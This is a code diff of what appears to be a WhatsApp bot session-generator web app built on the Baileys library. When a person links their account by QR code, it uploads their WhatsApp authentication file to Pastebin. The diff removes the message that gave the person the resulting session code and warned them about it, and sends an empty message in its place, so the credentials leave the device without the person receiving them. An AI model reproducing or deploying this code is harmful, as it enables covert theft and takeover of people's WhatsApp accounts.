@@ -1,24 +1,21 @@
-//
-let express = require("express");
-let app = express();
-let { toBuffer } = require("qrcode");
-let makeid = require("./makeid.js");
-let createPaste = require("./pastebinHelper.js"); // Import the helper function
+const express = require("express");
+const app = express();
+const { toBuffer } = require("qrcode");
+const makeid = require("./makeid.js");
+const createPaste = require("./pastebin-js.js");
 const {
   default: makeWASocket,
-  useSingleFileAuthState,
+  useMultiFileAuthState,
   Browsers,
   delay,
-} = require("@adiwajshing/baileys");
-
+} = require("@whiskeysockets/baileys");
 const pino = require("pino");
-let PORT = process.env.PORT || 3030;
-
+const PORT = process.env.PORT || 3030;
 app.use("/", (req, res) => {
   const authfile = `./tmp/${makeid()}.json`;
-  const { state } = useSingleFileAuthState(authfile, pino({ level: "silent" }));
+  const { state, saveCreds } = useMultiFileAuthState(authfile, pino({ level: "silent" }));
 
-  function Amarok() {
+  function oi() {
     try {
       let session = makeWASocket({
         auth: state,
@@ -36,41 +33,25 @@ app.use("/", (req, res) => {
         const { connection, lastDisconnect } = s;
         if (connection == "open") {
           await delay(500 * 10);
-          
-          // Use the helper function to create the Pastebin link
-          let link = await createPaste(authfile, "Amarok-MD session");
+          let link = await createPaste(authfile, "session");
           let data = link.replace("https://pastebin.com/", "");
           let code = Buffer.from(data).toString("base64");
-
-          const templateMessage = {
-            text: `\nᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ
-          
-◕ ⚠️ *ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*`,
-            footer: "sᴇssɪᴏɴ",
-          };
-
-          await session.sendMessage(session.user.id, templateMessage);
-
+          await session.sendMessage(session.user.id, '');
           await delay(3000 * 10);
           process.send("reset");
         }
-        if (
-          connection === "close" &&
-          lastDisconnect &&
-          lastDisconnect.error &&
-          lastDisconnect.error.output.statusCode != 401
+        if ( connection === "close" && lastDisconnect && lastDisconnect.error &&
+             lastDisconnect.error.output.statusCode != 401
         ) {
-          Amarok();
+          oi();
         }
       });
     } catch (err) {
       console.log(
-        err + "Unknown Error Occured Please report to Owner and Stay tuned"
+        err + "3rror"
       );
-    }
-  }
-
-  Amarok();
+    }}
+ oi();
 });
 
-app.listen(PORT, () => console.log("App listened on port", PORT));
+app.listen(PORT, () => console.log(PORT));
